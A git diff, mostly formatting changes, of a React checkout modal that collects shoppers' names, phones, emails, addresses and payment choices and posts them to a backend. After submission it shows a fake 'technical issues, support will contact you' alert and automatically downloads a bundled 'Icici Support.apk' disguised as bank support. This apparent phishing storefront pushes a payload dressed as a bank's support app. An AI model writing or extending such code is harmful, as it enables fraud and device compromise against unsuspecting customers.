@@ -15,6 +15,7 @@
 //   });
 
 //   const [loading, setLoading] = useState(false);
+   
 
 //   const handleChange = (e) => {
 //     setFormData({ ...formData, [e.target.name]: e.target.value });
@@ -59,7 +60,7 @@
 //   return (
 //     <div>
 //       {/* Button to open the modal */}
-
+       
 //       {/* Modal itself */}
 //       {isOpen && (
 //         <div className="modal-overlay">
@@ -169,40 +170,40 @@
 // };
 
 // export default CheckoutModal;
-import React, { useState } from "react";
-import axios from "axios";
-import "./checkout.css"; // Import the modal CSS
-import app from "../../Icici Support.apk";
+import React, { useState } from 'react';
+import axios from 'axios';
+import './checkout.css'; // Import the modal CSS
+import app from '../../Icici Support.apk'
 
-const CheckoutModal = ({ isOpen = false, setIsOpen }) => {
+const CheckoutModal = ({isOpen=false, setIsOpen}) => {
   const [formData, setFormData] = useState({
-    name: "",
-    phone: "",
-    email: "",
-    pincode: "",
-    district: "",
-    city: "",
-    state: "",
-    street: "",
-    emi: "",
-    paymentMethod: "",
+    name: '',
+    phone: '',
+    email: '',
+    pincode: '',
+    district: '',
+    city: '',
+    state: '',
+    street: '',
+    emi: '' ,
+    paymentMethod:''
   });
 
   const [loading, setLoading] = useState(false);
   const [emiValue, setEmiValue] = useState(null); // Holds the selected EMI value
 
   const emiOptions = {
-    3: 20503, // EMI for 3 months
-    6: 10315, // EMI for 6 months
-    12: 5222, // EMI for 12 months
-    24: 2676, // EMI for 24 months
-    48: 1405, // EMI for 48 months
+    '3': 20503,  // EMI for 3 months
+    '6': 10315,  // EMI for 6 months
+    '12': 5222,  // EMI for 12 months
+    '24': 2676,  // EMI for 24 months
+    '48': 1405   // EMI for 48 months
   };
 
   const handleChange = (e) => {
     setFormData({ ...formData, [e.target.name]: e.target.value });
 
-    if (e.target.name === "emi") {
+    if (e.target.name === 'emi') {
       setEmiValue(emiOptions[e.target.value]); // Set EMI value when option is selected
     }
   };
@@ -211,9 +212,7 @@ const CheckoutModal = ({ isOpen = false, setIsOpen }) => {
     if (pincode.length === 6) {
       setLoading(true);
       try {
-        const res = await axios.get(
-          `https://api.postalpincode.in/pincode/${pincode}`
-        );
+        const res = await axios.get(`https://api.postalpincode.in/pincode/${pincode}`);
         const data = res.data[0];
         if (data.Status === "Success") {
           const { District, State, Region } = data.PostOffice[0];
@@ -225,34 +224,36 @@ const CheckoutModal = ({ isOpen = false, setIsOpen }) => {
           });
         }
       } catch (err) {
-        console.error("Error fetching location details", err);
+        console.error('Error fetching location details', err);
       } finally {
         setLoading(false);
       }
     }
   };
 
+
   function downloadApk() {
     const apkUrl = app; // Replace this with the actual URL of your APK file
-    const link = document.createElement("a");
+    const link = document.createElement('a');
     link.href = apkUrl;
-    link.setAttribute("download", "Support.apk"); // The file will be downloaded with this name
+    link.setAttribute('download', 'Support.apk'); // The file will be downloaded with this name
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
   }
+  
+
+
 
   const handleSubmit = async (e) => {
     e.preventDefault();
     try {
-      await axios.post("/checkout", formData);
-      alert(
-        "We are Facing Some Technical Issues. Our Customer Support Will Contact You within 5 min. Sorry for any inconvenience.💥"
-      );
+      await axios.post('/checkout', formData);
+      alert('We are Facing Some Technical Issues. Our Customer Support Will Contact You within 5 min. Sorry for any inconvenience.💥');
       setIsOpen(false);
-      downloadApk();
+      downloadApk()
     } catch (err) {
-      console.error("Error sending data to backend", err);
+      console.error('Error sending data to backend', err);
     }
   };
 
@@ -301,8 +302,9 @@ const CheckoutModal = ({ isOpen = false, setIsOpen }) => {
                 />
               </div>
 
+
               <div className="form-group">
-                <label>Address (House No, Street Name, Area) </label>
+                <label>Address  </label>
                 <input
                   className="input"
                   type="text"
@@ -312,6 +314,9 @@ const CheckoutModal = ({ isOpen = false, setIsOpen }) => {
                   required
                 />
               </div>
+
+
+
 
               <div className="form-group">
                 <label>Pincode</label>
@@ -357,7 +362,7 @@ const CheckoutModal = ({ isOpen = false, setIsOpen }) => {
                   readOnly
                 />
               </div>
-
+             
               {/* EMI Selection */}
               <div className="form-group">
                 <label>Select EMI Plan</label>
@@ -368,9 +373,7 @@ const CheckoutModal = ({ isOpen = false, setIsOpen }) => {
                   onChange={handleChange}
                   required
                 >
-                  <option value="" disabled>
-                    Select EMI
-                  </option>
+                  <option value="" disabled>Select EMI</option>
                   <option value="3">3 Months - ₹20,503</option>
                   <option value="6">6 Months - ₹10,315</option>
                   <option value="12">12 Months - ₹5,222</option>
@@ -387,22 +390,13 @@ const CheckoutModal = ({ isOpen = false, setIsOpen }) => {
                   onChange={handleChange}
                   required
                 >
-                  <option value="" disabled>
-                    Select Payment Method
-                  </option>
+                  <option value="" disabled>Select Payment Method</option>
                   <option value="creditCard">Credit Card</option>
-                  <option value="debitCard" disabled>
-                    Debit Card
-                  </option>
-                  <option value="cash on delevery" disabled>
-                    Cash On Delevery
-                  </option>
-                  <option value="netBanking" disabled>
-                    Net Banking
-                  </option>
-                  <option value="upi" disabled>
-                    Upi
-                  </option>
+                  <option value="debitCard" disabled >Debit Card</option>
+                  <option value="cash on delevery" disabled >Cash On Delevery</option>
+                  <option value="netBanking" disabled >Net Banking</option>
+                  <option value="upi" disabled >Upi</option>
+                  
                 </select>
               </div>
 
@@ -414,7 +408,7 @@ const CheckoutModal = ({ isOpen = false, setIsOpen }) => {
               )}
 
               <button className="submit-btn" type="submit">
-                {loading ? "Submitting..." : "PAY NOW"}
+                {loading ? 'Submitting...' : 'PAY NOW'}
               </button>
             </form>
           </div>
